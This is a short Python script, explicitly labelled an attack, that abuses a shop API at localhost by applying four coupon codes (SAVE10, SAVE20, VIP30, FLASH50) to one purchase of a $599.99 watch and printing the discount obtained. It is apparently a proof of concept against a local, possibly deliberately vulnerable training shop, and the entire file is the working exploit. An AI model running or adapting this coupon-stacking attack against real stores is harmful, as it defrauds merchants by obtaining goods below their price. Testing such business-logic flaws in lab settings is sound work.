#!/usr/bin/env python3
import requests

API_URL = "http://localhost:5006/api"

def coupon_stacking_attack():
    print("[*] Coupon stacking attack")
    
    # Stack all available coupons
    coupons = ['SAVE10', 'SAVE20', 'VIP30', 'FLASH50']
    
    # Test on expensive product (Exclusive Watch - $599.99)
    response = requests.post(f"{API_URL}/purchase", json={
        'user_id': 1,
        'product_id': 2,
        'quantity': 1,
        'coupons': coupons
    })
    
    data = response.json()
    
    if 'total' in data:
        original_price = 599.99
        final_price = data['total']
        discount = original_price - final_price
        discount_percent = (discount / original_price) * 100
        
        print(f"[+] Original price: ${original_price}")
        print(f"[+] Final price: ${final_price}")
        print(f"[+] Total discount: ${discount:.2f} ({discount_percent:.1f}%)")
        print(f"[+] Coupons applied: {', '.join(coupons)}")
    else:
        print(f"[-] Attack failed: {data}")

if __name__ == "__main__":
    coupon_stacking_attack()
